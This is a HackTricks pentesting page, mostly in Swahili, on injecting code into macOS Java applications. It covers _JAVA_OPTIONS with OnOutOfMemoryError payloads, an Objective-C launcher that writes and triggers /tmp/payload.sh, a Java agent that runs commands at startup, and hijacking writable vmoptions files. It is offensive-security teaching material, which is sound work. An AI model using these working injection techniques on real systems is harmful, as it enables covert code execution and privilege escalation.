# macOS Java Applications Injection

{{#include ../../../banners/hacktricks-training.md}}

## Enumeration

Pata programu za Java zilizowekwa kwenye mfumo wako. Iligundulika kwamba programu za Java katika **Info.plist** zitakuwa na baadhi ya vigezo vya java ambavyo vina mfuatano wa herufi **`java.`**, hivyo unaweza kutafuta hilo:
```bash
# Search only in /Applications folder
sudo find /Applications -name 'Info.plist' -exec grep -l "java\." {} \; 2>/dev/null

# Full search
sudo find / -name 'Info.plist' -exec grep -l "java\." {} \; 2>/dev/null
```
## \_JAVA_OPTIONS

Kigezo cha env **`_JAVA_OPTIONS`** kinaweza kutumika kuingiza vigezo vya java vya kiholela katika utekelezaji wa programu iliyotengenezwa kwa java:
```bash
# Write your payload in a script called /tmp/payload.sh
export _JAVA_OPTIONS='-Xms2m -Xmx5m -XX:OnOutOfMemoryError="/tmp/payload.sh"'
"/Applications/Burp Suite Professional.app/Contents/MacOS/JavaApplicationStub"
```
Ili kuitekeleza kama mchakato mpya na si kama mtoto wa terminal ya sasa unaweza kutumia:
```objectivec
#import <Foundation/Foundation.h>
// clang -fobjc-arc -framework Foundation invoker.m -o invoker

int main(int argc, const char * argv[]) {
@autoreleasepool {
// Specify the file path and content
NSString *filePath = @"/tmp/payload.sh";
NSString *content = @"#!/bin/bash\n/Applications/iTerm.app/Contents/MacOS/iTerm2";

NSError *error = nil;

// Write content to the file
BOOL success = [content writeToFile:filePath
atomically:YES
encoding:NSUTF8StringEncoding
error:&error];

if (!success) {
NSLog(@"Error writing file at %@\n%@", filePath, [error localizedDescription]);
return 1;
}

NSLog(@"File written successfully to %@", filePath);

// Create a new task
NSTask *task = [[NSTask alloc] init];

/// Set the task's launch path to use the 'open' command
[task setLaunchPath:@"/usr/bin/open"];

// Arguments for the 'open' command, specifying the path to Android Studio
[task setArguments:@[@"/Applications/Android Studio.app"]];

// Define custom environment variables
NSDictionary *customEnvironment = @{
@"_JAVA_OPTIONS": @"-Xms2m -Xmx5m -XX:OnOutOfMemoryError=/tmp/payload.sh"
};

// Get the current environment and merge it with custom variables
NSMutableDictionary *environment = [NSMutableDictionary dictionaryWithDictionary:[[NSProcessInfo processInfo] environment]];
[environment addEntriesFromDictionary:customEnvironment];

// Set the task's environment
[task setEnvironment:environment];

// Launch the task
[task launch];
}
return 0;
}
```
Hata hivyo, hiyo itasababisha kosa kwenye programu iliyotekelezwa, njia nyingine ya siri ni kuunda wakala wa java na kutumia:
```bash
export _JAVA_OPTIONS='-javaagent:/tmp/Agent.jar'
"/Applications/Burp Suite Professional.app/Contents/MacOS/JavaApplicationStub"

# Or

open --env "_JAVA_OPTIONS='-javaagent:/tmp/Agent.jar'" -a "Burp Suite Professional"
```
> [!CAUTION]
> Kuunda wakala kwa **toleo tofauti la Java** kutoka kwa programu kunaweza kusababisha kuanguka kwa utekelezaji wa wakala na programu zote mbili

Mahali ambapo wakala anaweza kuwa:
```java:Agent.java
import java.io.*;
import java.lang.instrument.*;

public class Agent {
public static void premain(String args, Instrumentation inst) {
try {
String[] commands = new String[] { "/usr/bin/open", "-a", "Calculator" };
Runtime.getRuntime().exec(commands);
}
catch (Exception err) {
err.printStackTrace();
}
}
}
```
Ili kukusanya wakala, endesha:
```bash
javac Agent.java # Create Agent.class
jar cvfm Agent.jar manifest.txt Agent.class # Create Agent.jar
```
Na `manifest.txt`:
```
Premain-Class: Agent
Agent-Class: Agent
Can-Redefine-Classes: true
Can-Retransform-Classes: true
```
Na kisha peleka variable ya env na uendeshe programu ya java kama:
```bash
export _JAVA_OPTIONS='-javaagent:/tmp/j/Agent.jar'
"/Applications/Burp Suite Professional.app/Contents/MacOS/JavaApplicationStub"

# Or

open --env "_JAVA_OPTIONS='-javaagent:/tmp/Agent.jar'" -a "Burp Suite Professional"
```
## vmoptions file

Fail hii inasaidia kufafanua **Java params** wakati Java inatekelezwa. Unaweza kutumia baadhi ya hila za awali kubadilisha java params na **kufanya mchakato utekeleze amri zisizo na mipaka**.\
Zaidi ya hayo, faili hii pia inaweza **kujumuisha nyingine** na saraka ya `include`, hivyo unaweza pia kubadilisha faili iliyojumuishwa.

Zaidi ya hayo, baadhi ya programu za Java zitakuwa **zinaweza kupakia zaidi ya moja `vmoptions`** faili.

Baadhi ya programu kama Android Studio zinaonyesha katika **matokeo yao ambapo wanatafuta** faili hizi, kama:
```bash
/Applications/Android\ Studio.app/Contents/MacOS/studio 2>&1 | grep vmoptions

2023-12-13 19:53:23.920 studio[74913:581359] fullFileName is: /Applications/Android Studio.app/Contents/bin/studio.vmoptions
2023-12-13 19:53:23.920 studio[74913:581359] fullFileName exists: /Applications/Android Studio.app/Contents/bin/studio.vmoptions
2023-12-13 19:53:23.920 studio[74913:581359] parseVMOptions: /Applications/Android Studio.app/Contents/bin/studio.vmoptions
2023-12-13 19:53:23.921 studio[74913:581359] parseVMOptions: /Applications/Android Studio.app.vmoptions
2023-12-13 19:53:23.922 studio[74913:581359] parseVMOptions: /Users/carlospolop/Library/Application Support/Google/AndroidStudio2022.3/studio.vmoptions
2023-12-13 19:53:23.923 studio[74913:581359] parseVMOptions: platform=20 user=1 file=/Users/carlospolop/Library/Application Support/Google/AndroidStudio2022.3/studio.vmoptions
```
Ikiwa hawafanyi hivyo, unaweza kuangalia kwa urahisi kwa:
```bash
# Monitor
sudo eslogger lookup | grep vmoption # Give FDA to the Terminal

# Launch the Java app
/Applications/Android\ Studio.app/Contents/MacOS/studio
```
Kumbuka jinsi ilivyo ya kuvutia kwamba Android Studio katika mfano huu inajaribu kupakia faili **`/Applications/Android Studio.app.vmoptions`**, mahali ambapo mtumiaji yeyote kutoka kwenye **`admin` group ana ruhusa ya kuandika.** 

{{#include ../../../banners/hacktricks-training.md}}
